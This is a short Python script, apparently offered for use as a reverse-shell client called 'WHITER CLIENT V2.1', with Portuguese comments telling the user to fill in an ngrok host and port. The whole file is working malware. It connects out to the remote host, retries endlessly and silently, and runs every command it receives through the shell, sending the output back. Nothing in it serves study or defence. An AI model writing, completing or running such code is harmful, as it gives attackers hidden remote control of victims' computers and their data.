import socket
import subprocess
import os

HOST = '0.tcp.ngrok.io'  # TROCA PELO SEU IP DO NGROK
PORT = 12345             # TROCA PELA PORTA DO NGROK

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            banner = """
██╗    ██╗██╗  ██╗██╗████████╗███████╗██████╗     
██║    ██║██║  ██║██║╚══██╔══╝██╔════╝██╔══██╗    
██║ █╗ ██║███████║██║   ██║   █████╗  ██████╔╝    
██║███╗██║██╔══██║██║   ██║   ██╔══╝  ██╔══██╗    
╚███╔███╔╝██║  ██║██║   ██║   ███████╗██║  ██║    
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    
        W H I T E R   C L I E N T   V2.1 By Jhon
"""
            s.send(banner.encode())
            while True:
                comando = s.recv(1024).decode()
                if comando.lower() == 'exit':
                    break
                elif comando.startswith('cd '):
                    try:
                        os.chdir(comando[3:])
                        s.send(f"[+] Diretório: {os.getcwd()}".encode())
                    except Exception as e:
                        s.send(f"[!] Erro: {str(e)}".encode())
                else:
                    resultado = subprocess.getoutput(comando)
                    s.send(resultado.encode() if resultado else b'[+] Executado.')
            s.close()
        except:
            continue

connect()
